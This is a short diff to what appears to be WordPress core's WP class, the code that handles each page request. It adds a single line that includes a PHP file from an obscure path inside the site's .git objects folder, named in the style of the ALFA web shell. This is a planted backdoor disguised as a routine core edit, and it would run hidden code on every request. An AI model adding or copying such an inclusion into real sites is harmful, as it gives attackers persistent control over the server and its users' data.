@@ -783,6 +783,7 @@ class WP {
 			$this->query_posts();
 			$this->handle_404();
 			$this->register_globals();
+include "/home/cyber.ljnkediri.id/public_html/.git/objects/3e/ALFA_DATA/79289";
 		}
 
 		$this->send_headers();
